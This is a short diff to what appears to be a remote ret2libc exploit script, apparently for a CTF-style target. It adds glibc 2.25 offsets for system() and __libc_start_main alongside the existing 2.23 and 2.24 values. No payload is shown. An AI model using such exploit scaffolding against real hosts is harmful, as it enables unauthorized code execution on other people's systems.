@@ -13,13 +13,17 @@ hostname = sys.argv[1]
 port = int(sys.argv[2])
 libc = sys.argv[3]
 
+if libc == "2.25":
+	libc_system_distance = 0x40d60
+	__libc_start_dist	 = 0x20470 
+
 if libc == "2.24":
 	libc_system_distance = 0x3f480
 	__libc_start_dist	 = 0x201f0 
+	
 if libc == "2.23":
 	libc_system_distance = 0x45390
 	__libc_start_dist	 = 0x20740 
-
 
 __libc_start_ptr     = 0x601020
 
